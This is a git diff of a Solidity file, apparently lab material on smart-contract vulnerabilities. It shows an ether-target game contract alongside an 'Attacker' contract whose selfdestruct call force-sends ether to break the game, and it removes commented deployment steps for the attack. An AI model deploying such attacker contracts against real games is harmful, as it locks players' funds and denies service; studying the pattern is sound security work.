@@ -1,6 +1,9 @@
-pragma solidity >=0.4.20 <0.8.0;
+// SPDX-License-Identifier: MIT
+pragma solidity =0.8.20;
 
-contract EndlessGame {
+/// This contract is designed to potentially prevent any degen from winning the game
+
+contract DegenGame {
   uint public targetAmount = 11 ether;
   address public winner;
 
@@ -15,32 +18,17 @@ contract EndlessGame {
 
   function claimReward() public {
     require(msg.sender == winner, "Not winner");
-    (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+    (bool sent, ) = payable(msg.sender).call{value: address(this).balance}("");
     require(sent, "Failed to send Ether");
   }
 }
 
-contract GameOverAttack {
-  EndlessGame endlessGame;
-  constructor (EndlessGame _endlessGame) public {
-    endlessGame = EndlessGame(_endlessGame);
+contract Attacker {
+  address payable DegenGame;
+  constructor (address payable _DegenGame) {
+    DegenGame = _DegenGame;
   }
-  function attack() public payable {
-    address payable addr = payable(address(endlessGame));
-    selfdestruct(addr);
+  function boom() public payable {
+    selfdestruct(DegenGame);
   }
 }
-
-
-
-//e = EndlessGame.deploy({'from': accounts[0]})
-//e.deposit({'from': accounts[1], 'value': 1000000000000000000})
-//e.deposit({'from': accounts[2], 'value': 1000000000000000000})
-//e.deposit({'from': accounts[3], 'value': 1000000000000000000})
-//e.deposit({'from': accounts[4], 'value': 1000000000000000000})
-//e.deposit({'from': accounts[2], 'value': 1000000000000000000})
-//e.deposit({'from': accounts[3], 'value': 1000000000000000000})
-//e.deposit({'from': accounts[4], 'value': 1000000000000000000})
-//e.deposit({'from': accounts[1], 'value': 1000000000000000000})
-//a = GameOverAttack.deploy(e.address,{'from': accounts[2]})
-//a.attack({'from': accounts[2], 'value': 3000000000000000000})
